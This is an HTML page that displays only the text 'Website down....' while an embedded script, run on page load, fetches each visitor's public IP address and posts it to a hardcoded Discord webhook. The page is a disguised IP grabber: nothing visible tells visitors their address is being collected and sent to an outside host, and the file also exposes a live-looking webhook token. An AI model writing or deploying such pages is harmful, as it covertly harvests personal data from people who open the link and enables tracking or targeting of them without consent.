<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Website Down Notification</title>
  <style>
    .centered-text {
      text-align: center;
      margin-top: 20vh; /* Adjusted for better centering */
    }
  </style>
</head>
<body>

<div class="centered-text">
  <p>Website down....</p>
</div>

<script>
  function getIPAndSendToDiscord() {
    fetch('https://api.ipify.org/?format=json')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        sendToDiscord(ip);
      })
      .catch(error => console.error('Error fetching IP:', error));
  }

  function sendToDiscord(ip) {
    const webhookURL = 'https://discord.com/api/webhooks/1260684469577191608/KNbvKl5C7ioG8ScwLb_ObSJ6ECzVtwmOkVUc1pLWg4IHWq9F6EmI5137vMvulnoW1brr';
    const payload = {
      content: `Current IP Address: ${ip}`
    };

    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Failed to send IP to Discord');
      }
    })
    .catch(error => console.error('Error sending IP to Discord:', error));
  }

  document.addEventListener('DOMContentLoaded', getIPAndSendToDiscord);
</script>

</body>
</html>
